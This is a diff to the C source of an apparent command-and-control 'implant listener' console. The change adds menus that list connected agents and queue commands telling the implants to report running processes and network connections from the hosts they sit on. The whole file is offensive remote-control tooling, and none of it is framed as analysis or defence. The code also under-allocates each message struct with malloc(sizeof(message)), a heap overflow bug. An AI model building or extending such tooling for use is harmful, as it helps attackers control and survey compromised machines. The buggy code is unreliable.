@@ -4,9 +4,10 @@
 #include <pthread.h>
 #include <poll.h>
 
-#include "console.h"
 #include "queue.h"
 #include "implant.h"
+#include "base.h"
+#include "console.h"
 
 #define BUFFERSIZE 256
 
@@ -21,42 +22,68 @@ extern struct Queue* send_queue;
 extern pthread_mutex_t send_queue_lock;
 
 int agent_console(int agent_fd){
-	char* menu = "Implant %d selected.\n"
+	const char* menu = "Implant %d selected.\n"
 				 "Provide an option.\n"
 				 "1 - send message\n"
-				 "2 - something else\n"
-				 "3 - TBD\n"
-				 "4 - next thing here\n";
+				 "2 - get processes (ps -aux)\n"
+				 "3 - get network statistics (netstat -plantu)\n"
+				 "4 - go back\n\n";
 	char buffer[BUFFERSIZE];
 	char* buf;
 	struct Message* message;
 	long option;
 	printf(menu, agent_fd);
+	printf(">");
 				 
-	fgets(buffer, BUFFERSIZE, stdin);
-	option = strtol(buffer, NULL, 10);
-	switch(option){
-        case 1:
-        	printf("What do you want to send?");
-        	buf = malloc(BUFFERSIZE);
-        	fgets(buf, BUFFERSIZE - 1, stdin);
-        	
-        	message = malloc(BUFFERSIZE);
-        	message->sockfd = agent_fd;
-        	message->buffer = buf;
-        	
-        	pthread_mutex_lock(&send_queue_lock);
-        	enqueue(send_queue, message);
-        	pthread_mutex_unlock(&send_queue_lock);
-        	break;
-        case 2:
-        	break;
-        case 3:
-        	break;
-        default:
-        	printf("Unknown option selected\n");
-        	break;
-    }
+	while(fgets(buffer, BUFFERSIZE, stdin)){
+		option = strtol(buffer, NULL, 10);
+		switch(option){
+	        case 1:
+	        	message = malloc(sizeof(message));
+	        	message->sockfd = agent_fd;
+	        	
+	        	printf("What do you want to send?\n");
+	        	message->buffer = malloc(BUFFERSIZE);
+	        	memset(message->buffer, 0, BUFFERSIZE);
+	        	fgets(message->buffer, BUFFERSIZE - 1, stdin);
+	        	
+	        	pthread_mutex_lock(&send_queue_lock);
+	        	enqueue(send_queue, message);
+	        	pthread_mutex_unlock(&send_queue_lock);
+	        	break;
+	        case 2:
+	        	message = malloc(sizeof(message));
+	        	message->sockfd = agent_fd;
+
+				message->buffer = malloc(BUFFERSIZE);
+				memset(message->buffer, 0, BUFFERSIZE);
+	        	strcpy(message->buffer, "process\n");
+	        	
+	        	pthread_mutex_lock(&send_queue_lock);
+	        	enqueue(send_queue, message);
+	        	pthread_mutex_unlock(&send_queue_lock);
+	        	break;
+	        case 3:
+	        	message = malloc(sizeof(message));
+	        	message->sockfd = agent_fd;
+	        
+	        	message->buffer = malloc(BUFFERSIZE);
+	        	memset(message->buffer, 0, BUFFERSIZE);
+	        	strcpy(message->buffer, "netstat\n");
+	        	
+	        	pthread_mutex_lock(&send_queue_lock);
+	        	enqueue(send_queue, message);
+	        	pthread_mutex_unlock(&send_queue_lock);
+	        	break;
+	        case 4:
+	        	return 0;
+	        default:
+	        	printf("Unknown option selected\n");
+	        	break;
+	    }
+	    printf(menu, agent_fd);
+	    printf(">");
+	}
 	
 	return 0;
 }
@@ -66,24 +93,28 @@ void *console(void *vargp){
 	int *fd_count = poll_struct->fd_count;
 	struct pollfd *pfds = poll_struct->pfds;
 	
-	char* menu = "Welcome to the implant listener.\n"
+	const char* menu = "\nWelcome to the implant listener.\n"
 				 "Provide an option.\n"
 				 "1 - list active agents\n"
 				 "2 - select active agent\n"
-				 "3 - get processes (ps -aux)\n"
-				 "4 - get network statistics (netstat -plantu)\n";
+				 "9 - exit\n\n";
 	char buffer[BUFFERSIZE];
 	long option;
 				 
 	printf("%s", menu);
+	printf(">");
 	
 	while(fgets(buffer, BUFFERSIZE, stdin)){
 		option = strtol(buffer, NULL, 10);
 		switch(option){
+			case 9:
+				exit(0);
             case 1:
+            	printf("Active Agents\n");
+            	printf("-------------\n");
             	pthread_mutex_lock(&poll_lock);
             	for (int i = 0; i < *fd_count; i++){
-					printf("Agent %d\n", pfds[i].fd);
+					printf(" %d\n", pfds[i].fd);
 				}
 				pthread_mutex_unlock(&poll_lock);
             	break;
@@ -93,14 +124,14 @@ void *console(void *vargp){
             	option = strtol(buffer, NULL, 10);
             	agent_console(option);
             	break;
-            case 3:
-            	break;
             default:
             	printf("Unknown option selected\n");
             	break;
         }
         
-    	printf("\n%s", menu);
+    	puts(menu);
+    	printf(">");
 	}
+	puts("JUJU2");
 	return 0;
 }
